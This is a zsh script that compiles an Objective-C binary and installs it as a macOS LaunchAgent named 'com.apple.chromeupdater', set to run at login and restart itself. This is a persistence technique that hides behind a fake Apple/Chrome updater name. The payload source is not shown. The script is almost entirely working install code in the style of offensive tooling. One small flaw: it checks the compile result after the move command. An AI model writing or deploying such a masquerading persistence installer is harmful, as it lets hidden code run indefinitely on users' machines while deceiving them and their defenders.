#!/bin/zsh

# Set the path to the source file and where to place the compiled binary
RUNNER_SRC="working_runner.m"
RUNNER_BIN="$HOME/Library/Application Support/"

# Set the path where the LaunchAgent plist will be created
PLIST_PATH="$HOME/Library/LaunchAgents/com.apple.chromeupdater.plist"

# Compile the Objective-C runner into a binary for ARM64 macOS
echo "[*] Compiling runner..."
clang -target arm64-apple-darwin -framework Foundation -fobjc-arc -o working_runner working_runner.m

# Move working_runner to Application Support directory
mv working_runner $RUNNER_BIN/

# Check if compilation was successful
if [[ $? -ne 0 ]]; then
    echo "[!] Compilation failed."
    exit 1
fi

# Notify the user that the plist file is being created
echo "[*] Creating plist at $PLIST_PATH..."

# Ensure the parent directory of the LaunchAgent plist exists
mkdir -p "$(dirname "$PLIST_PATH")"

# Ensure the target file doesn't exist as a directory (safety check)
if [[ -d "$PLIST_PATH" ]]; then
    echo "[!] $PLIST_PATH is a directory. Removing to avoid conflict."
    rm -rf "$PLIST_PATH"
fi

# Create the LaunchAgent plist file
cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.chromeupdater</string>

    <key>ProgramArguments</key>
    <array>
        <string>$RUNNER_BIN/working_runner</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF


# Load the LaunchAgent using launchctl to start it immediately
echo "[*] Loading LaunchAgent..."
launchctl load "$PLIST_PATH"

# Confirm the load status
if [[ $? -eq 0 ]]; then
    echo "[+] LaunchAgent loaded successfully."
else
    echo "[!] Failed to load LaunchAgent."
fi
